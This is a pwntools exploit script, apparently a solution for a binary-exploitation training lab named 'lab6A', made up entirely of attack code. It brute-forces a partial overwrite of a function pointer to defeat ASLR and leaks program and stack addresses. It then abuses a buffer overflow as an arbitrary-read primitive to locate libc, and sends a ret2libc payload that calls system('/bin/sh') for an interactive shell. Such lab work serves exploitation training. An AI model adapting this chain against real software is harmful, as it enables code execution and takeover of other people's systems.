from pwn import *

USERNAME_LEN = 2
OVERRIDE_SIZE = 119

elf = ELF("./lab6A")
print_name_offset = 0x00000BE2
write_wrap_offset = 0x07A
# choice is at 0xffe65808 (4 bytes before userinfo)
# userinfo starts at 0xffe6580c

# make_note buf overwrite eip offset cyclic_find(0x6161616e) = 52

libc = elf.libc
import sys

# sys.exit(0)

g_found = False


def trigger_make_note(p):
    p.sendline(b"1")
    p.clean()

    p.send(b"AAAA" + b"\x00" * 28)  # username - will not be null terminated!
    # gdb.attach(p, "b *(write_wrap)")
    p.clean()
    # we can trigger an arbitrary read here...
    p.send(b"B" * 118 + p32(elf.sym["make_note"]) + b"\x00" * (128 - 118 - 4))


def trigger_arbitrary_read(p, addr):
    # info(f"Triggering arbitrary read... {hex(addr)}")
    # make account - in order to overwrite the username (first field in &userinfo).
    p.sendline(b"1")
    p.clean()

    p.send(p32(addr) + b"\x00" * 28)  # username - will not be null terminated!
    # gdb.attach(p, "b *(write_wrap)")
    p.clean()
    # we can trigger an arbitrary read here...
    p.send(
        b"B" * 118 + p32(elf.sym["write_wrap"]) + b"\x00" * (128 - 118 - 4)
    )  # p32(0xDEADBEEF))
    # for i in range(10):
    # todo why we do need this?
    # p.sendline(b"")
    # [*] memory[0xffa59600] = 0xf7ecba60

    # p.recv(8).ljust(b"\x00", 8)
    p.sendline(b"3")
    p.recvuntil(b"Enter Choice: ", drop=True)
    arbitrary_read_data = p.recv(8).ljust(8, b"\x00")
    if arbitrary_read_data == b"Enter Ch":
        # this read failed
        return 0, 0
    first_dword = u32(arbitrary_read_data[0:4])
    second_dword = u32(arbitrary_read_data[4:8])
    p.clean()
    return first_dword, second_dword
    #    global g_found
    #    if not g_found and first_dword == 0x43434343:
    #        info("FOUND START OF USER !!!")
    #        g_found = True
    if first_dword != 0:
        info(f"memory[{hex(addr)}] = {hex(first_dword)}")
    if second_dword != 0:
        info(f"memory[{hex(addr+4)}] = {hex(second_dword)}")
    return arbitrary_read_data


# stack in main : 0xffbb7878
# stack from leak : 0xffbb8087


i = 0
while True:
    info("trying...")
    guess = 13 * 0x1000 + print_name_offset
    i += 1
    print(hex(guess))
    p = process("./lab6A")
    p.clean()
    p.sendline(b"1")  # make account
    p.send(
        b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    )  # username - will not be null terminated!
    p.send(
        b"B" * 90 + p16(guess)
    )  # p16(guess))  # override sfunc 2 least significant bytes
    # gdb.attach(p)
    p.sendline(b"3")
    try:
        tmp = p.recvuntil(b"Username: ", drop=True, timeout=0.1)
        if tmp == b"":
            p.close()
            continue
        else:
            info("here")
            leak = p.recvline()[160:]
            print(leak)
            print(f"leak len {len(leak)}")
            # gdb.attach(p)
            print_name_addr = u32(leak[0:4])
            print(hex(print_name_addr))
            some_stack_addr = u32(leak[4:8].ljust(4, b"\x00"))
            print(hex(some_stack_addr))
            base_addr = print_name_addr - print_name_offset
            elf.address = base_addr
            info(f"Calculated base address = {hex(base_addr)}")
            # print(hex(u32(leak[8:12])))
            info(f"got leak! {leak=}")
            print(f"{hex(guess)} success!")
            p.clean()

            print(f"leaked stack addr ... {hex(some_stack_addr)}")
            # gdb.attach(p)
            some_stack_addr -= 9000
            some_stack_addr = some_stack_addr - (
                some_stack_addr % 4
            )  # make sure we are aligned to 4
            while True:
                first, second = trigger_arbitrary_read(p, some_stack_addr)
                if first & 0xFF000FFF == 0xF70005F3:
                    info(f"found libc symbol at {hex(some_stack_addr)} !!! {first}")
                    libc.address = first - (libc.sym["__libc_start_main"] + 147)
                    break
                # if second % 0x1000 == libc.sym["_IO_file_jumps"] % 0x1000:
                if second & 0xFF000FFF == 0xF70005F3:
                    info(f"found libc symbol at {hex(some_stack_addr)} !!! {second}")
                    libc.address = second - (libc.sym["__libc_start_main"] + 147)
                    break
                some_stack_addr += 8
            info(f"libc base address is {hex(libc.address)}")
            # gdb.attach(p)
            # p.recvuntil(b"Make a Note About your listing...:")

            # now change the sfunc to point to make_note

            trigger_make_note(p)
            rop_payload = (
                b"A" * 52
                + p32(libc.sym["system"])
                + p32(0xFAFAFAFA)  # ret address for system - we don't care
                + p32(next(libc.search(b"/bin/sh\x00")))
            )
            print(p.clean())
            p.sendline(b"3")
            print(p.clean())
            p.sendline(rop_payload)
            p.interactive()
    except EOFError:
        p.close()
        continue
    except KeyboardInterrupt:
        p.close()
        sys.exit(0)
    except Exception as e:
        info("EXCPETION !!!!")
        import traceback

        traceback.print_exc()
        p.close()
        break


# gdb.attach(p)
